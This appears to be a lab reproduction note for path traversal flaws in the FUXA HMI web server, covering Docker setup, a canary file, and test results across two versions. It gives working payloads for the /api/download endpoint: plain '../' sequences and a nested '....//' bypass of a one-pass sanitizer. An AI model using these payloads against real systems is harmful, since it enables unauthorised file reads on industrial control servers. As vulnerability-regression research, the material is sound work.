## Recipe bring-up (no committed images/source; official FUXA tags pulled at up-time)
  PCB_FLAG=<token> docker compose --profile v0 --profile v1 up -d
  # entrypoint (working_dir /usr/src/app/FUXA/server): writes $PCB_FLAG -> /canary.txt
  #             (outside reportsDir=/usr/src/app/FUXA/server/_reports), then exec npm start
  # oracle.py --run-gate does the whole up -> gate -> down cycle automatically
  # FUXA default settings leave secureEnabled unset -> auth disabled -> /api/download reachable.

## Sink (same for seed AND residual -> Variant A):
  GET /api/download?cmd=REPORT-DOWNLOAD&name=<payload>
     -> reportPath = path.join(reportsDir, sanitize(name)); res.sendFile(reportPath)

## Payloads (sent with curl -G --data-urlencode; express decodes before the sanitizer runs)
  seed   (CVE-2023-31718, plain ../) : name = ('../'   x10) + 'canary.txt'
  bypass (CVE-2026-25951, nested)    : name = ('....//' x10) + 'canary.txt'
  # V1 sanitizer: req.query.name.replace(new RegExp('../','g'),'') -- ONE pass.
  #   plain  ../  -> stripped entirely -> 'canary.txt' (no traversal)   => BLOCKED
  #   nested ....// -> each collapses to ../ after one pass             => TRAVERSES

## V0 = frangoteam/fuxa:1.1.13 (port 39610) — pre-CVE-2023-31718 (raw path.join)
  seed   plain ../   : HTTP 200  CANARY-HIT   <- CVE-2023-31718 works (no regex)
  bypass nested ....//: HTTP 400  MISS (no regex to collapse -> literal '....' dirs; expected)
  normal GET /canary.txt : HTTP 404  (outside served paths; only reachable by traversal)

